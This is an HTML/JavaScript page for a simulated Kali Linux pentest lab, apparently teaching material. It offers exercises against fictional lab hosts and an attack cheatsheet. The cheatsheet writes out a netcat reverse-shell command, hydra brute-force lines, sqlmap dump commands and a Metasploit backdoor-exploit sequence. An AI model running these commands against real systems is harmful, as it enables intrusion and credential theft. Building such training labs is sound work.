@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux — Cybersecurity Lab Terminal</title>
+<style>
+:root{--bg:#0A0A0F;--bg2:#111118;--bg3:#1A1A24;--border:#2D2D3F;--kali-green:#39FF14;--kali-red:#FF3E3E;--kali-blue:#5BC8F5;--kali-purple:#C792EA;--kali-yellow:#FFCB6B;--kali-orange:#F78C6C;--kali-cyan:#80CBC4;--white:#CDD3DE;--gray:#6B7280;--prompt-user:#FF3E3E;--prompt-host:#39FF14;--prompt-path:#5BC8F5;--header-bg:#1A0A2E;--radius:8px;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html,body{height:100%;overflow:hidden;}
+body{font-family:'Segoe UI',-apple-system,sans-serif;background:var(--bg);color:var(--white);}
+.site-header{background:var(--header-bg);color:white;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;flex-shrink:0;border-bottom:1px solid #3D1A6E;}
+.site-header h1{font-size:15px;font-weight:700;color:#E879F9;}
+.site-header p{font-size:11px;color:#A78BFA;margin-top:1px;}
+.nav-links{display:flex;gap:5px;flex-wrap:wrap;}
+.nav-link{font-size:10px;padding:3px 9px;border-radius:5px;background:rgba(232,121,249,.12);color:#C4B5FD;text-decoration:none;font-weight:600;transition:all .2s;}
+.nav-link:hover{background:rgba(232,121,249,.25);color:white;}
+.app{display:flex;height:calc(100vh - 56px);overflow:hidden;}
+.sidebar{width:280px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;flex-shrink:0;}
+.sidebar-tabs{display:flex;border-bottom:1px solid var(--border);}
+.stab{flex:1;padding:8px 4px;text-align:center;font-size:10px;font-weight:700;color:var(--gray);cursor:pointer;transition:all .2s;border-bottom:2px solid transparent;}
+.stab.active{color:var(--kali-purple);border-bottom-color:var(--kali-purple);}
+.stab:hover{color:var(--white);}
+.sidebar-content{flex:1;overflow-y:auto;padding:10px;}
+.sidebar-content::-webkit-scrollbar{width:3px;}
+.sidebar-content::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px;}
+.ex-section{margin-bottom:14px;}
+.ex-section-title{font-size:9px;font-weight:700;color:var(--gray);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px;}
+.ex-item{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:9px;margin-bottom:5px;cursor:pointer;transition:all .2s;}
+.ex-item:hover{border-color:var(--kali-purple);}
+.ex-item.active{border-color:var(--kali-purple);background:#1E1A2E;}
+.ex-item.done{border-color:var(--kali-green);opacity:.8;}
+.ex-title{font-size:11px;font-weight:600;color:var(--white);display:flex;align-items:center;gap:5px;}
+.ex-badge{font-size:8px;padding:1px 5px;border-radius:99px;font-weight:700;}
+.badge-easy{background:#0D2B0D;color:var(--kali-green);}
+.badge-medium{background:#2B1F0D;color:var(--kali-yellow);}
+.badge-hard{background:#2B0D0D;color:var(--kali-red);}
+.ex-desc{font-size:10px;color:var(--gray);margin-top:3px;line-height:1.4;}
+.prog-bar{height:3px;background:var(--border);border-radius:99px;overflow:hidden;margin-top:5px;}
+.prog-fill{height:100%;background:linear-gradient(90deg,var(--kali-green),var(--kali-cyan));border-radius:99px;transition:width .4s;}
+.prog-label{font-size:9px;color:var(--gray);margin-top:2px;text-align:right;}
+.cs-section{margin-bottom:12px;}
+.cs-title{font-size:9px;font-weight:700;color:var(--kali-purple);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;}
+.cs-cmd{display:flex;gap:6px;margin-bottom:3px;padding:3px 5px;border-radius:4px;cursor:pointer;transition:background .15s;}
+.cs-cmd:hover{background:var(--bg3);}
+.cs-cmd-name{font-family:'Cascadia Code','Fira Code',monospace;font-size:10px;color:var(--kali-yellow);min-width:100px;flex-shrink:0;}
+.cs-cmd-desc{font-size:10px;color:var(--gray);line-height:1.3;}
+.net-host{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:8px;margin-bottom:6px;}
+.net-host.attacker{border-color:var(--kali-green);}
+.net-host.target{border-color:var(--kali-red);}
+.net-host.scanned{border-color:var(--kali-blue);}
+.net-host-ip{font-family:'Cascadia Code','Fira Code',monospace;font-size:11px;font-weight:700;}
+.net-host.attacker .net-host-ip{color:var(--kali-green);}
+.net-host.target .net-host-ip{color:var(--kali-red);}
+.net-host.scanned .net-host-ip{color:var(--kali-blue);}
+.net-host-name{font-size:10px;color:var(--gray);margin-top:1px;}
+.net-host-ports{font-size:9px;color:var(--kali-cyan);margin-top:4px;line-height:1.6;}
+.net-status{font-size:9px;padding:1px 6px;border-radius:99px;font-weight:700;display:inline-block;margin-top:3px;}
+.status-unknown{background:#1A1A1A;color:var(--gray);}
+.status-live{background:#0D2B0D;color:var(--kali-green);}
+.status-pwned{background:#2B0D0D;color:var(--kali-red);}
+.challenge-bar{background:var(--bg2);border-top:1px solid var(--border);padding:9px 14px;flex-shrink:0;}
+.challenge-title{font-size:9px;font-weight:700;color:var(--kali-yellow);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px;}
+.challenge-text{font-size:11px;color:var(--white);line-height:1.5;}
+.challenge-hint{font-size:10px;color:var(--gray);margin-top:3px;display:none;}
+.challenge-hint.visible{display:block;}
+.challenge-btns{display:flex;gap:5px;margin-top:7px;}
+.cbtn{font-size:10px;padding:3px 9px;border-radius:5px;border:1px solid var(--border);cursor:pointer;font-weight:600;background:var(--bg3);color:var(--gray);transition:all .2s;}
+.cbtn:hover{color:var(--white);}
+.cbtn.hint-btn{color:var(--kali-purple);border-color:var(--kali-purple);}
+.cbtn.skip-btn{color:var(--kali-orange);border-color:var(--kali-orange);}
+.cbtn.reset-btn{color:var(--kali-red);border-color:var(--kali-red);}
+.terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+.term-top-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;align-items:center;gap:8px;flex-shrink:0;}
+.term-dot{width:11px;height:11px;border-radius:50%;}
+.dot-red{background:#FF5F57;}.dot-yellow{background:#FFBD2E;}.dot-green{background:#28CA41;}
+.term-title{font-size:11px;color:var(--gray);margin-left:4px;flex:1;font-family:'Cascadia Code','Fira Code',monospace;}
+.term-info{font-size:10px;color:var(--gray);}
+.terminal{flex:1;overflow-y:auto;padding:12px 16px;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:12px;line-height:1.65;cursor:text;}
+.terminal::-webkit-scrollbar{width:5px;}
+.terminal::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+.line{display:block;margin-bottom:0;}
+.prompt-line{display:flex;flex-wrap:wrap;align-items:baseline;gap:0;}
+.p-bracket{color:#C9D1D9;}.p-user{color:var(--kali-red);font-weight:700;}
+.p-at{color:#C9D1D9;}.p-host{color:var(--kali-green);font-weight:700;}
+.p-dash{color:#C9D1D9;}.p-path{color:var(--kali-blue);}
+.p-hash{color:#C9D1D9;font-weight:700;}
+.cmd-echo{color:#E8EAED;}
+.out-line{color:var(--white);white-space:pre-wrap;word-break:break-all;display:block;}
+.out-error{color:var(--kali-red);}
+.out-success{color:var(--kali-green);}
+.out-info{color:var(--kali-blue);}
+.out-warn{color:var(--kali-yellow);}
+.out-dim{color:var(--gray);}
+.out-port{color:var(--kali-cyan);}
+.out-vuln{color:var(--kali-orange);}
+.out-pwned{color:var(--kali-red);font-weight:700;}
+.out-flag{color:#FFD700;font-weight:700;}
+.input-row{display:flex;align-items:center;gap:0;margin-top:2px;}
+.input-prompt{color:var(--white);white-space:nowrap;flex-shrink:0;font-family:'Cascadia Code','Fira Code',monospace;}
+#cmd-input{flex:1;background:transparent;border:none;outline:none;color:#E8EAED;font-family:inherit;font-size:12px;caret-color:var(--kali-green);}
+@media(max-width:768px){.sidebar{width:220px;}}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <div>
+    <h1>&#x1F480; Kali Linux — Cybersecurity Lab Terminal</h1>
+    <p>Interactive pentest environment &middot; nmap &middot; nikto &middot; sqlmap &middot; hydra &middot; metasploit &middot; john</p>
+  </div>
+  <div class="nav-links">
+    <a href="../personal_site/index.html" class="nav-link">Home</a>
+    <a href="index.html" class="nav-link">IaaS Labs</a>
+    <a href="linux-terminal.html" class="nav-link">Linux</a>
+    <a href="cyber-lab.html" class="nav-link">Cyber Tracker</a>
+    <a href="docker-terminal.html" class="nav-link">Docker</a>
+    <a href="k8s-terminal.html" class="nav-link">K8s</a>
+  </div>
+</header>
+<div class="app">
+  <div class="sidebar">
+    <div class="sidebar-tabs">
+      <div class="stab active" onclick="showTab('exercises',this)">Exercises</div>
+      <div class="stab" onclick="showTab('cheatsheet',this)">Cheatsheet</div>
+      <div class="stab" onclick="showTab('network',this)">Network</div>
+    </div>
+    <div class="sidebar-content" id="tab-exercises">
+      <div style="margin-bottom:10px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px;">
+          <span style="font-size:10px;font-weight:700;color:var(--white);">Lab Progress</span>
+          <span style="font-size:9px;color:var(--kali-green);" id="prog-text">0 / 0 done</span>
+        </div>
+        <div class="prog-bar"><div class="prog-fill" id="prog-fill" style="width:0%"></div></div>
+      </div>
+      <div id="ex-list"></div>
+    </div>
+    <div class="sidebar-content" id="tab-cheatsheet" style="display:none;">
+      <div id="cheatsheet-content"></div>
+    </div>
+    <div class="sidebar-content" id="tab-network" style="display:none;">
+      <div style="font-size:9px;font-weight:700;color:var(--kali-purple);margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px;">Target Network — 10.10.10.0/24</div>
+      <div id="network-map"></div>
+    </div>
+  </div>
+  <div class="terminal-wrap">
+    <div class="term-top-bar">
+      <span class="term-dot dot-red"></span>
+      <span class="term-dot dot-yellow"></span>
+      <span class="term-dot dot-green"></span>
+      <span class="term-title">root@kali: ~</span>
+      <span class="term-info" id="term-info">Type <code style="color:var(--kali-yellow)">help</code> to list commands</span>
+    </div>
+    <div class="terminal" id="terminal" onclick="focusInput()">
+      <div id="output"></div>
+      <div class="input-row">
+        <span class="input-prompt" id="live-prompt"></span>
+        <input type="text" id="cmd-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" onkeydown="handleKey(event)">
+      </div>
+    </div>
+    <div class="challenge-bar" id="challenge-bar" style="display:none;">
+      <div class="challenge-title">&#x1F3AF; Current Challenge</div>
+      <div class="challenge-text" id="challenge-text"></div>
+      <div class="challenge-hint" id="challenge-hint"></div>
+      <div class="challenge-btns">
+        <button class="cbtn hint-btn" onclick="showHint()">Hint</button>
+        <button class="cbtn skip-btn" onclick="skipChallenge()">Skip</button>
+        <button class="cbtn reset-btn" onclick="resetLab()">Reset Lab</button>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+// ── State ─────────────────────────────────────────────────────────────────────
+const STATE = {
+  cwd: '/root',
+  scanDone: {},      // ip -> true
+  exploited: {},     // ip -> true
+  loot: [],
+  flags: [],
+  history: [],
+  histIdx: -1,
+  msfMode: false,
+  msfCtx: {},
+};
+
+// ── Virtual Filesystem ────────────────────────────────────────────────────────
+const FS = {
+  '/': {type:'dir',children:['root','etc','usr','tmp','var','home']},
+  '/root': {type:'dir',children:['tools','wordlists','targets','loot','samples','.bashrc']},
+  '/root/.bashrc': {type:'file',content:'export PATH=$PATH:/usr/local/sbin\nexport TERM=xterm-256color\nalias ls="ls --color=auto"\nalias ll="ls -la"\n'},
+  '/root/tools': {type:'dir',children:['linpeas.sh','pspy64','chisel']},
+  '/root/tools/linpeas.sh': {type:'file',content:'#!/bin/bash\n# Linux Privilege Escalation Awesome Script\necho "[+] Running LinPEAS..."\n'},
+  '/root/tools/pspy64': {type:'file',content:'# Process Spy - monitor processes without root\n'},
+  '/root/tools/chisel': {type:'file',content:'# Fast TCP/UDP tunnel over HTTP\n'},
+  '/root/wordlists': {type:'dir',children:['rockyou.txt','common.txt','directories.txt']},
+  '/root/wordlists/rockyou.txt': {type:'file',content:'[14,344,391 lines — RockYou password list]\npassword\n123456\npassword123\nletmein\nqwerty\n...'},
+  '/root/wordlists/common.txt': {type:'file',content:'[4,614 entries — Common passwords]\nadmin\nroot\ntoor\npassword\n...'},
+  '/root/wordlists/directories.txt': {type:'file',content:'[87,664 entries — Directory wordlist]\nadmin\nlogin\nbackup\nconfig\napi\nupload\n...'},
+  '/root/targets': {type:'dir',children:[]},
+  '/root/loot': {type:'dir',children:['README.txt']},
+  '/root/loot/README.txt': {type:'file',content:'# Loot Directory\nStore captured credentials, flags, and exfiltrated data here.\n'},
+  '/root/samples': {type:'dir',children:['hash.txt','suspicious.bin','capture.pcap']},
+  '/root/samples/hash.txt': {type:'file',content:'admin:5f4dcc3b5aa765d61d8327deb882cf99\nuser1:0d107d09f5bbe40cade3de5c71e9e9b7\nbackup_user:7c222fb2927d828af22f592134e8932480637c0d\n'},
+  '/root/samples/suspicious.bin': {type:'file',content:'[Binary file — use strings or xxd to analyze]\n'},
+  '/root/samples/capture.pcap': {type:'file',content:'[PCAP file — 1.2 MB — network traffic capture]\n'},
+  '/etc': {type:'dir',children:['hosts','passwd','shadow','crontab']},
+  '/etc/hosts': {type:'file',content:'127.0.0.1   localhost\n127.0.1.1   kali\n10.10.10.50  kali\n10.10.10.100 metasploitable\n10.10.10.101 winxp-box\n10.10.10.102 dvwa-box\n'},
+  '/etc/passwd': {type:'file',content:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash\n'},
+  '/etc/shadow': {type:'file',content:'[Permission denied — need root]\n'},
+  '/etc/crontab': {type:'file',content:'*/5 * * * * root /usr/local/sbin/cleanup.sh\n0 2 * * * root /usr/local/sbin/backup.sh\n'},
+  '/usr': {type:'dir',children:['share','bin','local']},
+  '/usr/share': {type:'dir',children:['wordlists','exploitdb']},
+  '/usr/share/wordlists': {type:'dir',children:['rockyou.txt','dirb']},
+  '/usr/share/wordlists/rockyou.txt': {type:'file',content:'[Symlink to /root/wordlists/rockyou.txt]\n'},
+  '/usr/share/wordlists/dirb': {type:'dir',children:['common.txt','big.txt']},
+  '/usr/share/wordlists/dirb/common.txt': {type:'file',content:'[4,614 entries]\n'},
+  '/usr/share/wordlists/dirb/big.txt': {type:'file',content:'[20,469 entries]\n'},
+  '/usr/share/exploitdb': {type:'dir',children:['searchsploit','exploits']},
+  '/tmp': {type:'dir',children:[]},
+  '/var': {type:'dir',children:['log']},
+  '/var/log': {type:'dir',children:['syslog','auth.log']},
+  '/var/log/syslog': {type:'file',content:'Jan 15 08:00:01 kali systemd[1]: Started Session.\nJan 15 08:00:05 kali kernel: eth0: Link is Up\nJan 15 09:00:01 kali CRON[1234]: CMD (/usr/local/sbin/cleanup.sh)\n'},
+  '/var/log/auth.log': {type:'file',content:'Jan 15 08:01:00 kali sshd[1234]: Accepted publickey for kali\nJan 15 10:30:11 kali sudo[9999]: kali : TTY=pts/0 ; COMMAND=/usr/bin/nmap\n'},
+  '/home': {type:'dir',children:['kali']},
+  '/home/kali': {type:'dir',children:['Desktop','Downloads']},
+};
+
+// ── Target Network ────────────────────────────────────────────────────────────
+const NETWORK = {
+  '10.10.10.50': {name:'kali (you)',os:'Kali Linux 2024.1',role:'attacker',ports:[]},
+  '10.10.10.100': {name:'Metasploitable2',os:'Ubuntu 8.04',role:'target',
+    ports:[
+      {num:21,proto:'ftp',service:'vsftpd 2.3.4'},
+      {num:22,proto:'ssh',service:'OpenSSH 4.7p1'},
+      {num:23,proto:'telnet',service:'Linux telnetd'},
+      {num:80,proto:'http',service:'Apache 2.4.7'},
+      {num:3306,proto:'mysql',service:'MySQL 5.0.51a'},
+      {num:5432,proto:'postgresql',service:'PostgreSQL 8.3'},
+    ],
+    vulns:['vsftpd 2.3.4 backdoor (CVE-2011-2523)','MySQL anonymous login','FTP anonymous login'],
+    flag:'FLAG{m3t4spl01t4bl3_pwn3d}',
+  },
+  '10.10.10.101': {name:'Windows XP SP3',os:'Windows XP Professional',role:'target',
+    ports:[
+      {num:80,proto:'http',service:'Microsoft IIS 6.0'},
+      {num:135,proto:'msrpc',service:'Microsoft Windows RPC'},
+      {num:139,proto:'netbios-ssn',service:'Microsoft netbios-ssn'},
+      {num:445,proto:'smb',service:'Windows XP microsoft-ds'},
+      {num:3389,proto:'rdp',service:'Microsoft Terminal Services'},
+    ],
+    vulns:['MS17-010 EternalBlue (SMBv1)','MS08-067 NetAPI','Weak SMB credentials'],
+    flag:'FLAG{3t3rn4l_blu3_pwn3d}',
+  },
+  '10.10.10.102': {name:'DVWA Box',os:'Ubuntu 16.04',role:'target',
+    ports:[
+      {num:22,proto:'ssh',service:'OpenSSH 7.4'},
+      {num:80,proto:'http',service:'Apache 2.4.18 + DVWA'},
+    ],
+    vulns:['SQL Injection at /dvwa/login.php','XSS in guestbook','File upload bypass','Weak credentials admin/password'],
+    flag:'FLAG{dvw4_sql1_pwn3d}',
+  },
+};
+
+// ── Exercises ─────────────────────────────────────────────────────────────────
+const EXERCISES = [
+  {id:'ex1',title:'Host Discovery',phase:'Recon',badge:'easy',done:false,
+   desc:'Discover live hosts on the target network segment.',
+   tasks:[
+     {id:'t1',text:'Check your IP address: <code>ip a</code> or <code>ifconfig</code>',check:c=>/^(ip\s+a|ip\s+addr|ifconfig)\s*$/.test(c.trim())},
+     {id:'t2',text:'Ping sweep the network: <code>nmap -sn 10.10.10.0/24</code>',check:c=>/nmap.*-sn.*10\.10\.10/.test(c)},
+     {id:'t3',text:'Check /etc/hosts for known targets: <code>cat /etc/hosts</code>',check:c=>/^cat\s+.*\/etc\/hosts/.test(c)||c.trim()==='cat /etc/hosts'},
+   ]},
+  {id:'ex2',title:'Port & Service Scan',phase:'Scanning',badge:'easy',done:false,
+   desc:'Run nmap to enumerate open ports and service versions.',
+   tasks:[
+     {id:'t1',text:'Service scan target 1: <code>nmap -sV 10.10.10.100</code>',check:c=>/nmap.*-sV.*10\.10\.10\.100/.test(c)||/nmap.*10\.10\.10\.100.*-sV/.test(c)},
+     {id:'t2',text:'Aggressive scan: <code>nmap -A 10.10.10.100</code>',check:c=>/nmap.*-A.*10\.10\.10\.100/.test(c)||/nmap.*10\.10\.10\.100.*-A/.test(c)},
+     {id:'t3',text:'Run vuln scripts: <code>nmap --script vuln 10.10.10.100</code>',check:c=>/nmap.*--script.*vuln.*10\.10\.10/.test(c)},
+   ]},
+  {id:'ex3',title:'Web Enumeration',phase:'Enumeration',badge:'easy',done:false,
+   desc:'Scan the DVWA box web server for vulnerabilities and hidden paths.',
+   tasks:[
+     {id:'t1',text:'Run nikto web scanner: <code>nikto -h 10.10.10.102</code>',check:c=>/nikto.*10\.10\.10\.102/.test(c)},
+     {id:'t2',text:'Directory brute force: <code>gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirb/common.txt</code>',check:c=>/gobuster.*10\.10\.10\.102/.test(c)},
+     {id:'t3',text:'View page with curl: <code>curl http://10.10.10.102</code>',check:c=>/curl.*10\.10\.10\.102/.test(c)},
+   ]},
+  {id:'ex4',title:'SMB Enumeration',phase:'Enumeration',badge:'medium',done:false,
+   desc:'Enumerate SMB shares and users on the Windows XP target.',
+   tasks:[
+     {id:'t1',text:'Scan SMB: <code>nmap -sV -p 445 10.10.10.101</code>',check:c=>/nmap.*445.*10\.10\.10\.101/.test(c)||/nmap.*10\.10\.10\.101.*445/.test(c)},
+     {id:'t2',text:'Enumerate SMB: <code>enum4linux 10.10.10.101</code>',check:c=>/enum4linux.*10\.10\.10\.101/.test(c)},
+     {id:'t3',text:'List SMB shares: <code>smbclient -L //10.10.10.101 -N</code>',check:c=>/smbclient.*10\.10\.10\.101/.test(c)},
+   ]},
+  {id:'ex5',title:'Password Cracking',phase:'Credential Access',badge:'medium',done:false,
+   desc:'Crack MD5 password hashes from the samples directory.',
+   tasks:[
+     {id:'t1',text:'View hashes: <code>cat /root/samples/hash.txt</code>',check:c=>/cat.*hash\.txt/.test(c)},
+     {id:'t2',text:'Crack with John: <code>john /root/samples/hash.txt --wordlist=/root/wordlists/rockyou.txt</code>',check:c=>/^john\s+/.test(c.trim())},
+     {id:'t3',text:'Crack with Hashcat: <code>hashcat -m 0 /root/samples/hash.txt /root/wordlists/rockyou.txt</code>',check:c=>/^hashcat\s+/.test(c.trim())},
+   ]},
+  {id:'ex6',title:'Web Exploitation — SQLi',phase:'Exploitation',badge:'medium',done:false,
+   desc:'Exploit SQL injection vulnerability in DVWA to extract database credentials.',
+   tasks:[
+     {id:'t1',text:'Search for exploits: <code>searchsploit dvwa</code>',check:c=>/searchsploit.*dvwa/i.test(c)},
+     {id:'t2',text:'Run SQLMap: <code>sqlmap -u "http://10.10.10.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" --dbs</code>',check:c=>/^sqlmap\s+/.test(c.trim())},
+     {id:'t3',text:'Dump users table: <code>sqlmap -u "http://10.10.10.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low" -D dvwa -T users --dump</code>',check:c=>/sqlmap.*--dump/.test(c)},
+   ]},
+  {id:'ex7',title:'FTP Exploitation',phase:'Exploitation',badge:'hard',done:false,
+   desc:'Exploit the vsftpd 2.3.4 backdoor on Metasploitable.',
+   tasks:[
+     {id:'t1',text:'Find exploit: <code>searchsploit vsftpd 2.3.4</code>',check:c=>/searchsploit.*vsftpd/i.test(c)},
+     {id:'t2',text:'Launch Metasploit: <code>msfconsole</code>',check:c=>/^msfconsole\s*$/.test(c.trim())},
+     {id:'t3',text:'Use the exploit: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>',check:c=>/use.*vsftpd/.test(c)||/use.*ftp.*backdoor/.test(c)},
+     {id:'t4',text:'Set target: <code>set RHOSTS 10.10.10.100</code>',check:c=>/set\s+RHOSTS\s+10\.10\.10\.100/.test(c)},
+     {id:'t5',text:'Run the exploit: <code>run</code> or <code>exploit</code>',check:c=>/^(run|exploit)\s*$/.test(c.trim())},
+   ]},
+  {id:'ex8',title:'Post-Exploitation',phase:'Post-Exploitation',badge:'hard',done:false,
+   desc:'Enumerate the compromised system and escalate privileges.',
+   tasks:[
+     {id:'t1',text:'Check current user: <code>whoami</code> and <code>id</code>',check:c=>/^(whoami|id)\s*$/.test(c.trim())},
+     {id:'t2',text:'Find SUID binaries: <code>find / -perm -u=s -type f 2>/dev/null</code>',check:c=>/find.*-perm.*-u=s/.test(c)||/find.*perm.*4000/.test(c)},
+     {id:'t3',text:'Check sudo privileges: <code>sudo -l</code>',check:c=>/^sudo\s+-l\s*$/.test(c.trim())},
+     {id:'t4',text:'Run LinPEAS: <code>bash /root/tools/linpeas.sh</code>',check:c=>/linpeas/.test(c)},
+   ]},
+  {id:'ex9',title:'Forensics & Analysis',phase:'Forensics',badge:'medium',done:false,
+   desc:'Analyze suspicious files and a network capture for indicators of compromise.',
+   tasks:[
+     {id:'t1',text:'Identify file type: <code>file /root/samples/suspicious.bin</code>',check:c=>/file.*suspicious\.bin/.test(c)},
+     {id:'t2',text:'Extract strings: <code>strings /root/samples/suspicious.bin</code>',check:c=>/strings.*suspicious\.bin/.test(c)},
+     {id:'t3',text:'Compute hash: <code>md5sum /root/samples/suspicious.bin</code>',check:c=>/md5sum.*suspicious\.bin/.test(c)||/sha256sum.*suspicious/.test(c)},
+     {id:'t4',text:'Hex dump: <code>xxd /root/samples/suspicious.bin | head -20</code>',check:c=>/xxd.*suspicious/.test(c)},
+   ]},
+];
+
+// ── Cheatsheet ─────────────────────────────────────────────────────────────────
+const CHEATSHEET = [
+  {cat:'Recon & Discovery',cmds:[
+    {n:'nmap -sn 10.10.10.0/24',d:'Host discovery (ping sweep)'},
+    {n:'nmap -sV 10.10.10.100',d:'Service version detection'},
+    {n:'nmap -A 10.10.10.100',d:'Aggressive scan (OS + scripts)'},
+    {n:'nmap -p- 10.10.10.100',d:'All 65535 ports'},
+    {n:'nmap --script vuln IP',d:'Run vulnerability NSE scripts'},
+    {n:'whois domain.com',d:'Domain registration info'},
+    {n:'dig domain.com ANY',d:'DNS records lookup'},
+    {n:'host domain.com',d:'Quick DNS resolution'},
+  ]},
+  {cat:'Web Enumeration',cmds:[
+    {n:'nikto -h 10.10.10.102',d:'Web vulnerability scanner'},
+    {n:'gobuster dir -u http://IP -w wordlist',d:'Directory brute force'},
+    {n:'curl -I http://IP',d:'Check HTTP headers'},
+    {n:'curl http://IP/robots.txt',d:'View robots.txt'},
+    {n:'ffuf -u http://IP/FUZZ -w wordlist',d:'Fast fuzzer'},
+  ]},
+  {cat:'SMB & Network',cmds:[
+    {n:'enum4linux IP',d:'SMB/Samba enumeration'},
+    {n:'smbclient -L //IP -N',d:'List SMB shares (no auth)'},
+    {n:'smbclient //IP/share -N',d:'Connect to share anonymously'},
+    {n:'netstat -tlnp',d:'Listening ports'},
+    {n:'ss -tlnp',d:'Socket statistics'},
+  ]},
+  {cat:'Password Attacks',cmds:[
+    {n:'hydra -l admin -P rockyou.txt IP ssh',d:'SSH brute force'},
+    {n:'hydra -l admin -P rockyou.txt IP ftp',d:'FTP brute force'},
+    {n:'hydra -l admin -P rockyou.txt IP http-post-form',d:'HTTP form brute force'},
+    {n:'john hash.txt --wordlist=rockyou.txt',d:'John the Ripper'},
+    {n:'hashcat -m 0 hash.txt rockyou.txt',d:'MD5 crack with hashcat'},
+    {n:'hashcat -m 1000 hash.txt rockyou.txt',d:'NTLM crack'},
+  ]},
+  {cat:'Exploitation',cmds:[
+    {n:'searchsploit vsftpd 2.3.4',d:'Find known exploits'},
+    {n:'sqlmap -u "URL?id=1" --dbs',d:'SQLi - list databases'},
+    {n:'sqlmap -u "URL" -D db -T tbl --dump',d:'SQLi - dump table'},
+    {n:'msfconsole',d:'Launch Metasploit Framework'},
+    {n:'nc -nvlp 4444',d:'Start netcat listener'},
+    {n:'nc IP 4444 -e /bin/bash',d:'Reverse shell via netcat'},
+  ]},
+  {cat:'Post-Exploitation',cmds:[
+    {n:'whoami && id',d:'Current user and groups'},
+    {n:'uname -a',d:'Kernel version'},
+    {n:'sudo -l',d:'Check sudo privileges'},
+    {n:'find / -perm -u=s -type f 2>/dev/null',d:'SUID binaries'},
+    {n:'find / -writable -type f 2>/dev/null',d:'World-writable files'},
+    {n:'cat /etc/crontab',d:'Scheduled tasks'},
+    {n:'env',d:'Environment variables'},
+    {n:'bash /root/tools/linpeas.sh',d:'Run LinPEAS privesc script'},
+  ]},
+  {cat:'Forensics',cmds:[
+    {n:'file suspicious.bin',d:'Identify file type'},
+    {n:'strings suspicious.bin',d:'Extract printable strings'},
+    {n:'xxd file | head -20',d:'Hex dump first 20 lines'},
+    {n:'md5sum file',d:'MD5 hash of file'},
+    {n:'sha256sum file',d:'SHA-256 hash of file'},
+    {n:'binwalk suspicious.bin',d:'Extract embedded files'},
+  ]},
+];
+
+// ── Command Outputs ───────────────────────────────────────────────────────────
+function runCommand(raw){
+  const cmd = raw.trim();
+  if(!cmd) return;
+  STATE.history.unshift(cmd);
+  STATE.histIdx = -1;
+
+  if(STATE.msfMode){
+    handleMsfCommand(cmd);
+    return;
+  }
+
+  const parts = cmd.split(/\s+/);
+  const prog = parts[0];
+  const args = parts.slice(1);
+
+  switch(prog){
+    case 'help': return cmdHelp();
+    case 'clear': return clearOutput();
+    case 'exit': case 'logout': return out('Use the Reset Lab button to restart.','out-info');
+    case 'pwd': return out(STATE.cwd,'out-line');
+    case 'whoami': return out('root','out-success');
+    case 'id': return out('uid=0(root) gid=0(root) groups=0(root)','out-success');
+    case 'hostname': return out('kali','out-line');
+    case 'uname': return cmdUname(args);
+    case 'date': return out(new Date().toString(),'out-line');
+    case 'env': return cmdEnv();
+    case 'uptime': return out('up 2 days, 4:20, 1 user, load average: 0.42, 0.38, 0.35','out-line');
+    case 'history': return cmdHistory();
+    case 'ls': return cmdLs(args);
+    case 'cd': return cmdCd(args);
+    case 'cat': return cmdCat(args);
+    case 'mkdir': return cmdMkdir(args);
+    case 'touch': return cmdTouch(args);
+    case 'cp': return cmdCp(args);
+    case 'mv': return cmdMv(args);
+    case 'rm': return cmdRm(args);
+    case 'chmod': return out('Mode changed.','out-success');
+    case 'echo': return out(args.join(' '),'out-line');
+    case 'find': return cmdFind(args);
+    case 'grep': return cmdGrep(args);
+    case 'strings': return cmdStrings(args);
+    case 'file': return cmdFile(args);
+    case 'md5sum': return cmdMd5sum(args);
+    case 'sha256sum': return cmdSha256sum(args);
+    case 'xxd': return cmdXxd(args);
+    case 'binwalk': return cmdBinwalk(args);
+    case 'ip': return cmdIp(args);
+    case 'ifconfig': return cmdIfconfig();
+    case 'netstat': return cmdNetstat(args);
+    case 'ss': return cmdSs(args);
+    case 'ping': return cmdPing(args);
+    case 'arp': return out('Address                  HWtype  HWaddress           Flags Mask  Iface\n10.10.10.1               ether   52:54:00:12:34:56   C           eth0\n10.10.10.100             ether   08:00:27:aa:bb:cc   C           eth0\n10.10.10.101             ether   08:00:27:dd:ee:ff   C           eth0\n10.10.10.102             ether   08:00:27:11:22:33   C           eth0','out-line');
+    case 'nmap': return cmdNmap(args, cmd);
+    case 'nikto': return cmdNikto(args);
+    case 'gobuster': return cmdGobuster(args,cmd);
+    case 'ffuf': return cmdFfuf(args);
+    case 'curl': return cmdCurl(args);
+    case 'wget': return cmdWget(args);
+    case 'whois': return cmdWhois(args);
+    case 'dig': return cmdDig(args);
+    case 'host': return cmdHost(args);
+    case 'nslookup': return cmdNslookup(args);
+    case 'hydra': return cmdHydra(args,cmd);
+    case 'john': return cmdJohn(args);
+    case 'hashcat': return cmdHashcat(args);
+    case 'enum4linux': return cmdEnum4linux(args);
